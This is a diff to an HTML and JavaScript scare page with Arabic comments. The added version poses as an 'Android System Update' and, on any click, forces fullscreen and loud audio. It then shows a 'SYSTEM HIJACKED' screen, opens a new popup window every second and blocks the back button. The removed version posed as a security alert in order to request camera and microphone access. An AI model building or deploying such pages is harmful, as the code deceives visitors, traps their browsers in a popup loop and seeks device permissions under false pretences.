@@ -3,85 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_REPAIR_DZ ⚠️</title>
+    <title>⚙️ Android System Update</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; }
         
-        /* صورة المرأة اللي تغطي الشاشة سواسوة */
+        /* صورة المرأة المرعبة (المراقبة) سواسوة */
         #stalkerEntity { 
             position: fixed; top: 0; left: 0; width: 105vw; height: 105vh; 
             object-fit: cover; z-index: 1; display: none;
-            filter: contrast(180%) brightness(40%);
-            animation: stalkingGaze 6s infinite ease-in-out;
+            filter: contrast(200%) brightness(30%) grayscale(100%);
+            animation: breathingStalker 5s infinite ease-in-out;
         }
 
-        @keyframes stalkingGaze {
-            0%, 100% { transform: scale(1) translate(-2.5%, -2.5%); }
-            50% { transform: scale(1.06) translate(-5%, -5%); }
+        @keyframes breathingStalker {
+            0%, 100% { transform: scale(1); filter: brightness(30%); }
+            50% { transform: scale(1.05); filter: brightness(50%); }
         }
 
-        /* نافذة الأذونات المزيفة سواسوة */
-        #permissionBox {
-            position: fixed; z-index: 100; background: #111; color: white;
-            padding: 25px; border-radius: 15px; border: 1px solid #333;
-            text-align: center; font-family: sans-serif; width: 85%;
-            box-shadow: 0 0 50px rgba(0,0,0,1);
+        /* واجهة التحديث الوهمية سواسوة */
+        #loaderBox {
+            position: fixed; z-index: 100; color: #0f0; text-align: center;
+            width: 80%; top: 50%; left: 50%; transform: translate(-50%, -50%);
         }
 
-        .btn-allow { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 5px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
+        .progress-bar { width: 100%; background: #222; height: 10px; border-radius: 5px; margin-top: 15px; overflow: hidden; }
+        .progress-fill { width: 0%; background: #0f0; height: 100%; animation: fill 10s forwards; }
         
-        #deepWebOverlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; color: #f00; text-align: center; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.8); padding: 30px; border: 1px solid #900; display: none; width: 90%; }
-        .blink-red { animation: blinker 0.1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0.5; } }
+        @keyframes fill { to { width: 100%; } }
+
+        #deepWebOverlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            z-index: 200; background: rgba(0,0,0,0.9); color: #f00; 
+            display: none; flex-direction: column; justify-content: center; align-items: center;
+            text-align: center;
+        }
+
+        .blink { animation: blinker 0.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
-<body>
+<body onclick="startInfection()">
 
-    <div id="permissionBox">
-        <h3 style="margin-top:0;">⚠️ تنبيه أمني</h3>
-        <p style="font-size: 14px; color: #ccc;">يتطلب "نظام الحماية" الوصول إلى الأذونات التالية لإصلاح أعطال المتصفح:</p>
-        <ul style="text-align: right; font-size: 13px; color: #aaa;">
-            <li>الوصول إلى الكاميرا (للمسح الحي)</li>
-            <li>الوصول إلى الموقع (لتحديد الخادم)</li>
-            <li>إذن العرض فوق التطبيقات الأخرى</li>
-        </ul>
-        <button class="btn-allow" onclick="requestFullAccess()">سماح بالكل (Allow All)</button>
+    <div id="loaderBox">
+        <p id="statusText">Installing System Update... 14%</p>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <p style="font-size: 10px; color: #555; margin-top: 10px;">Don't turn off your device</p>
     </div>
 
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
     <div id="deepWebOverlay">
-        <h1 class="blink-red">STALKER SYSTEM</h1>
-        <p>تم اختراق النظام.. كل أذوناتك أصبحت لنا سواسوة.</p>
-        <input type="text" style="background:#000; color:#f00; border:1px solid #f00; padding:10px; width:80%; text-align:center;" placeholder="أدخل كود فك التشفير">
+        <h1 class="blink">SYSTEM HIJACKED</h1>
+        <p style="padding: 20px;">[ERROR_403]: تم سحب صلاحيات المسؤول.<br>جهازك الآن تحت مراقبة STALKER SYSTEM.<br>لا يمكنك الخروج حتى إكمال المهمة.</p>
+        <p style="font-size: 12px; color: #fff;">ROOT_DIR: /system/bin/stalker_virus</p>
     </div>
 
     <audio id="sfx" loop><source src="tfy-krk.mp3" type="audio/mpeg"></audio>
 
     <script>
-        async function requestFullAccess() {
-            // 1. طلب الكاميرا والميكروفون حقيقة سواسوة
-            try {
-                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-            } catch (e) { console.log("Permission Denied but we continue..."); }
+        let stage = 0;
 
-            // 2. إخفاء النافذة وبدء الكابوس سواسوة
-            document.getElementById('permissionBox').style.display = 'none';
-            document.getElementById('stalkerEntity').style.display = 'block';
-            document.getElementById('deepWebOverlay').style.display = 'block';
+        function startInfection() {
+            if(stage !== 0) return;
+            stage = 1;
 
-            // 3. تشغيل الصوت والـ Fullscreen سواسوة
+            // تشغيل الصوت والـ Fullscreen سواسوة
             const audio = document.getElementById('sfx');
             audio.volume = 1.0;
             audio.play();
             document.documentElement.requestFullscreen();
 
-            // 4. الحبس المؤبد سواسوة
+            // تحديث نص الخداع سواسوة
+            let progress = 14;
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 5);
+                document.getElementById('statusText').innerText = `Installing System Update... ${progress}%`;
+                
+                if(progress >= 100) {
+                    clearInterval(interval);
+                    showStalker();
+                }
+            }, 300);
+        }
+
+        function showStalker() {
+            document.getElementById('loaderBox').style.display = 'none';
+            document.getElementById('stalkerEntity').style.display = 'block';
+            document.getElementById('deepWebOverlay').style.display = 'flex';
+
+            // تفعيل الـ Loop الملعون سواسوة
             setInterval(() => {
-                window.open(window.location.href, '_blank', 'width=10,height=10');
+                // منع الخروج وتعطيل قوقل سواسوة بالتكامل مع سكريبت نانو
                 history.pushState(null, null, window.location.href);
+                window.open(window.location.href, '_blank', 'width=10,height=10');
             }, 1000);
         }
+
+        window.onpopstate = () => history.go(1);
     </script>
 </body>
 </html>
